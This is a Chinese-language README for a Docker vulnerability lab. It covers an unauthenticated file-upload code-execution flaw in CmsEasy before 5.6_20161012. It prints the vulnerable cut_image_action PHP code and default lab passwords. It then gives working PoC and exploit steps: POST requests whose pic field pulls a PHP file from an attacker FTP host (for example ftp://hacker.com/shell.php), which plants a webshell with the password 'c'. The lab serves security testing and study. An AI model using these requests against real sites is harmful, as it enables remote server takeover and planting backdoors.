## CmsEasy < 5.6 20161012 cut_image 代码执行漏洞

### 说明

感谢 [@cnsolu](https://github.com/cnsolu) 提供漏洞基础详情

### 漏洞信息

CmsEasy是一款基于PHP+Mysql 架构的网站内容管理系统，也是一个PHP开发平台。采用模块化方式开发，功能易用便于扩展，可面向大中型站点提供重量级网站建设解决方案。

CmsEasy < 5.6_20161012 版本 `cut_image_action` 函数存在代码执行漏洞，远程攻击者可在未登录的情况下向服务器上传任意文件，执行任意代码，获取服务器权限。

详细参考：[CmsEasy前台无限制GetShell](https://xianzhi.aliyun.com/forum/read/215.html)

### 漏洞相关代码

```php
function cut_image_action() {
    $len = 1;
    if(config::get('base_url') != '/'){
        $len = strlen(config::get('base_url'))+1;
    }
    if(substr($_POST['pic'],0,4) == 'http'){
        front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);
    }else{
        front::$post['thumb'] = substr($_POST['pic'],$len);
    }
    $thumb=new thumb();
    $thumb->set(front::$post['thumb'],'jpg');
    $img=$thumb->create_image($thumb->im,$_POST['w'],$_POST['h'],0,0,$_POST['x1'],$_POST['y1'],$_POST['x2'] -$_POST['x1'],$_POST['y2'$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));
    $save_file='upload/images/'.date('Ym').'/'.$new_name;
    @mkdir(dirname(ROOT.'/'.$save_file));
    ob_start();
    $thumb->out_image($img,null,85);
    file_put_contents(ROOT.'/'.$save_file,ob_get_contents());
    ob_end_clean();
    $image_url=config::get('base_url').'/'.$save_file;
    //$res['size']=ceil(strlen($img) / 1024);
    $res['code']="
                    //$('#cut_preview').attr('src','$image_url');
                    $('#thumb').val('$image_url');
                    alert(lang('save_success'));
    ";
    echo json::encode($res);
}
```

### 镜像信息

类型 | 用户名 | 密码
:-:|:-:|:-:
Mysql | root | root
/admin/ | admin | admin123

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:c_cmseasy_1
 ```

2. 启动环境

 ```
$ docker run -d -p 8000:80 medicean/vulapps:c_cmseasy_1
```

 > `-p 8000:80` 前面的 8000 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### PoC 使用

1. 图片处理

 将 [`poc_phpinfo_700x1120.png`](./poc_phpinfo_700x1120.png)，上传至攻击者FTP服务器并将后缀改为`.php`，如文件名被重命名为`phpinfo.php`
 
 > 也可根据这篇文章[「CmsEasy前台无限制GetShell」](https://xianzhi.aliyun.com/forum/read/215.html)自行生成，生成的脚本为 [jpg_payload.php](./jpg_payload.php)，感谢作者

2. 验证漏洞

 发起 POST 请求，地址为：

 ```
http://目标网站/index.php?case=tool&act=cut_image
 ```

 POST data:

 ```
pic=1ftp://攻击者FTP地址/phpinfo.php&w=700&h=1120&x1=0&x2=700&y1=0&y2=1120
 ```

3. 成功会返回

 ```
{"code":"\r\n \/\/$('#cut_preview').attr('src','\/upload\/images\/201612\/148159258747.php');\r\n $('#thumb').val('\/upload\/images\/201612\/148159258747.php');\r\n\t\t\t\t alert(lang('save_success'));\r\n "}
 ```

4. 访问上传成功后的php文件

 `http://你的 IP 地址:端口号/upload/images/201612/148159258747.php`


#### Exp 使用

使用的图片为 [`exp_eval_post_c_700x1120.png`](exp_eval_post_c_700x1120.png)，步骤与 PoC 使用完全相同。

一句话连接密码为`c`

#### POST data 详细说明

* w=x2=图片宽度
* h=y2=图片高度
* x1=y1=固定0

> 同一张图片，请求时若指定的宽度和高度的值不相同，gd 库转换后的结果也不相同

如果`$_POST['pic']`开头4个字符不是`http`的话，就认为是本站的文件，会从前面抽取掉baseurl（等于返回文件相对路径）所以构造的时候 如果站点不是放在根目录 则需要在前面补位`strlen(base_url)+2` 如果放在根目录 也需要补上1位（`/`的长度）

**举个例子：**

目标站 `http://www.target.com/easy/cmseasy/` 放在 cmseasy 子目录,就需要补上`strlen(base_url)+2 = strlen('cmseasy') + 2 = 9`位，POST数据就是
 
```
pic=111111111ftp://hacker.db/shell.php&w=228&h=146&x1=0&x2=228&y1=0&y2=146
```

目标站 `http://www.target2.com/` 放在web根目录 就需要补上1位，POST数据就是

```
pic=1ftp://hacker.com/shell.php&w=228&h=146&x1=0&x2=228&y1=0&y2=146
```
